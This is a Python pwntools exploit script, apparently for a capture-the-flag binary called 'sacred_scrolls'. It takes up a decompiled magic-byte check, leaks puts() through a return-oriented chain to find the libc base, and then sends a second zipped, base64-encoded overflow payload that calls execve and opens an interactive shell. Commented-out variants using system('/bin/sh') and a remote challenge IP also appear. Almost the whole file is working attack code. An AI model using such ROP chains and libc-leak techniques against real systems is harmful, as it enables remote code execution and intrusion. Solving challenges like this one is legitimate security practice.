from pwn import *
import base64
import os

context.arch = 'amd64'

elf = ELF('./sacred_scrolls')
libc = ELF('./glibc/libc.so.6')

'''
  fread(__s1,399,1,__stream);
  iVar1 = strncmp(__s1,&DAT_00401322,4);
  if (iVar1 == 0) {
    iVar1 = strncmp(__s1 + 4,&DAT_00401327,3);
    if (iVar1 == 0) {
      close((int)__stream);
      return __s1;
    }
  }

magic number check!:
\xf0\x9f\x91\x93\xe2\x9a\xa1
'''

padding = '\xf0\x9f\x91\x93\xe2\x9a\xa1' + 'A'*(33)

io = process('./sacred_scrolls')
#ip, port = "139.59.170.23", 32060
#io = remote(ip, port)

pop_rdi_ret = 0x00000000004011b3
puts_addr = 0x0000000000602f80
ret = 0x00000000004007ce

payload1 = padding
payload1 += p64(pop_rdi_ret)
payload1 += p64(elf.got['puts'])
payload1 += p64(elf.plt['puts'])
payload1 += p64(elf.symbols['main'])

with open('spell.txt', 'wb') as f:
        f.write(payload1)
os.system('zip spell0.zip spell.txt')
os.system('rm -f spell.txt')
payload = os.popen('cat spell0.zip').read()

io.sendlineafter('Enter your wizard tag:','1')
io.sendlineafter('>>', '1')
io.sendlineafter('[*] Enter file (it will be named spell.zip):', base64.b64encode(payload))
print base64.b64encode(payload)
io.sendlineafter('>>', '2')
io.sendlineafter('>>', '3')
io.recvuntil('\n')
io.recvuntil('\n')

puts_addr = u64(io.recvuntil('\n').strip().ljust(8, b'\x00'))
log.info("Leaked server's libc address, puts(): "+hex(puts_addr))

#puts_addr = 0x7ffff7e14ed0

server_libc_base = puts_addr - libc.symbols['puts']
log.info("Leaked server's libc base address: "+hex(server_libc_base))

libc.address = server_libc_base

'''
#payload2: get the shell
rop_libc = ROP(libc)
#rop_libc.call((rop_libc.find_gadget(['ret']))[0])  #!!Padding/16 bytes!
rop_libc.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])
payload2 = padding + p64(ret) + rop_libc.chain()
#payload2 = padding + rop_libc.chain()
'''
'''
io.sendafter(b'Enter your wizard tag: ', b'A' * 16)
io.recvuntil(b'A' * 16)
bin_sh_addr = u64(io.recvline().strip().ljust(8, b'\0'))
log.info('"/bin/sh" address: '+hex(bin_sh_addr))

payload2 = padding
payload2 += p64(pop_rdi_ret)
#payload2 += p64(next(libc.search('/bin/sh\x00')))
payload2 += p64(bin_sh_addr)
payload2 += p64(ret)
payload2 += p64(elf.plt['system'])
'''

padding = '\xf0\x9f\x91\x93\xe2\x9a\xa1' + 'A'*(25)
data_section = 0x603000
rbp = p64(data_section + 0x78)

payload2 = padding + rbp
payload2 += p64(libc.symbols['execve'])

io.sendafter(b'Enter your wizard tag: ', '1')

with open('spell.txt', 'wb') as f:
        f.write(payload2)
os.system('rm -f spell0.zip')
os.system('zip spell0.zip spell.txt')
os.system('rm -f spell.txt')
payload = os.popen('cat spell0.zip').read()


io.sendlineafter('>>', '1')
io.sendlineafter('[*] Enter file (it will be named spell.zip):', base64.b64encode(payload))
print base64.b64encode(payload)
io.sendlineafter('>>', '2')
io.sendlineafter('>>', '3')
io.recvuntil('\n')
io.recvuntil('\n')

io.interactive()

'''

'''
